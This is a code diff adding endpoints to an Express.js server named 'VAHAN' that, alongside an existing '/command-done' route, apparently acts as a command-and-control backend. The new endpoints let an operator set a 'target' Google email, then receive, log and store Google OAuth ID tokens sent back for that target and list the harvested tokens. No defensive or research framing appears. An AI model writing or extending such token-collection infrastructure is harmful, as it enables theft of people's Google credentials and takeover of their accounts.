@@ -183,6 +183,59 @@ app.post('/command-done', (req, res) => {
 });
 
 // ============================================
+// ENDPOINT: Set Target Email for Google Sign-In
+// ============================================
+app.post('/set-target', (req, res) => {
+    const key = req.headers['x-vahan-key'];
+    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
+    const { email } = req.body;
+    fs.writeFileSync('/tmp/target_email.txt', email);
+    console.log(`[VAHAN] 🎯 Target set: ${email}`);
+    res.json({ success: true, target: email });
+});
+
+// ============================================
+// ENDPOINT: Get Target Email
+// ============================================
+app.get('/target-email', (req, res) => {
+    if (req.query.key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
+    try {
+        const email = fs.readFileSync('/tmp/target_email.txt', 'utf8').trim();
+        res.json({ email });
+    } catch(e) { res.json({ email: null }); }
+});
+
+// ============================================
+// ENDPOINT: Receive Google OAuth Token
+// ============================================
+app.post('/google-token', (req, res) => {
+    const key = req.headers['x-vahan-key'];
+    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
+    
+    const { email, id_token } = req.body;
+    console.log(`[VAHAN] 🔑 GOOGLE TOKEN RECEIVED: ${email}`);
+    console.log(`[VAHAN] Token: ${id_token?.substring(0, 30)}...`);
+    
+    let tokens = [];
+    try { tokens = JSON.parse(fs.readFileSync('/tmp/google_tokens.json', 'utf8')); } catch(e) {}
+    tokens.push({ email, id_token, received_at: new Date().toISOString() });
+    fs.writeFileSync('/tmp/google_tokens.json', JSON.stringify(tokens, null, 2));
+    
+    res.json({ success: true });
+});
+
+// ============================================
+// ENDPOINT: Get Google Tokens
+// ============================================
+app.get('/google-tokens', (req, res) => {
+    if (req.query.key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
+    try {
+        const data = fs.readFileSync('/tmp/google_tokens.json', 'utf8');
+        res.json(JSON.parse(data));
+    } catch(e) { res.json([]); }
+});
+
+// ============================================
 // ENDPOINT 6: Clear database
 // ============================================
 app.post('/clear', (req, res) => {
